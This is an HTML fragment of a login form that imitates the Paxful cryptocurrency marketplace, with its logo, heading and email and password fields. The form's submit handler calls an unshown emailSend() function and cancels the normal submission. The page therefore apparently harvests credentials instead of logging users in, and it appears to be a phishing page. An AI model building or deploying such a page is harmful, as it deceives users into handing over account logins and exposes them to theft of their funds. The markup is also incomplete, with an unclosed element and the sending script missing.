<body>
  <nav class="flex justify-between my-9 items-center px-4">
    <img src="paxlogo.svg" alt="">
    <div class="language flex items-center gap-x-3 border border-gray-500 py-1 px-2">
      <i class="bi bi-globe2"></i>

  <form class="mx-auto" id="form" onsubmit="emailSend(); reset(); return false;"  method="POST">
    <div class="form__header pt-4 pb-8">
      <h1 class="capitalize text-2xl font-bold">Log in with paxful</h1>
    </div>
    <div class="inputsCtn w-full">
      <p class="label font-semibold py-2">Your Email Address</p>
      <input class="w-full p-[12px] rounded-sm" minlength="4" id="email" type="email" name="email" required>
      <input class="w-full p-[12px] rounded-sm" hidden>
      <div class="flex justify-between items-center">
        <p class="label font-semibold py-2 mt-5">Your Password</p>
        <p class="label font-semibold py-2 mt-5 b cursor-pointer">Forgot password?</p>
      </div>
      <input class="w-full p-[12px] rounded-sm" minlength="4" id="pass" type="password" name="pass" required>
    </div>
    <button class="mt-10 w-full flex items-center justify-between p-4 rounded-sm text-white" type="submit"
      name="register">Log in <i class="bi bi-chevron-right"></i></button>
    <hr class="mt-6 mb-6">
    <p class="flex gap-x-2">New on Paxful? <span class="b">Create an Account</span></p>
  </form>
